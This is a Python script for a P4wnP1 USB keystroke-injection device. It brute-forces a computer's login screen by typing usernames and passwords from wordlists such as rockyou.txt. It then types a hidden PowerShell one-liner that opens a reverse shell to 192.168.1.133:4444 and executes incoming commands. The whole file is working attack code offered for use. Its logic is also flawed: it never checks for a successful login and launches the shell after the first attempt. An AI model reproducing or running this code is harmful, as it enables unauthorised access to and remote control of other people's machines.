#!/usr/bin/env python3

import os, time, sys, argparse
P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from pathlib import Path
from p4wnhid import send_string, send_key, enter, sleep_ms

def try_login(username, password):
    print(f"[*] Trying {username}:{password}")
    send_key("ESC")               # Wake screen
    sleep_ms(500)

    if username:
        send_string(username)
        sleep_ms(200)
        send_key("TAB")
        sleep_ms(200)

    send_string(password)
    enter()
    sleep_ms(2500)

def spawn_reverse_shell():
    lhost = os.getenv("P4WN_LHOST", "192.168.1.133")
    lport = os.getenv("P4WN_LPORT", "4444")
    print(f"[*] Spawning reverse shell to {lhost}:{lport}")

    ps_command = f"""
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String );$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}"
""".strip()

    send_key("GUI", "R")
    sleep_ms(400)
    send_string("cmd")
    enter()
    sleep_ms(800)
    send_string(ps_command.replace("\n", " "))
    enter()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--userlist", default="/usr/share/wordlists/usernames.txt", help="Username list")
    parser.add_argument("--passlist", default="/usr/share/wordlists/rockyou.txt", help="Password list")
    parser.add_argument("--spawn-reverse", action="store_true", help="Launch reverse shell on success")
    args = parser.parse_args()

    users = [""]
    if Path(args.userlist).is_file():
        with open(args.userlist, "r", errors="ignore") as f:
            users = [line.strip() for line in f if line.strip()]

    if not Path(args.passlist).is_file():
        print(f"[!] Password list not found: {args.passlist}")
        sys.exit(1)

    with open(args.passlist, "r", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Trying {len(users)} usernames and {len(passwords)} passwords...")

    for username in users:
        for password in passwords:
            try_login(username, password)
            sleep_ms(1000)

            if args.spawn_reverse:
                spawn_reverse_shell()
                return

if __name__ == "__main__":
    main()
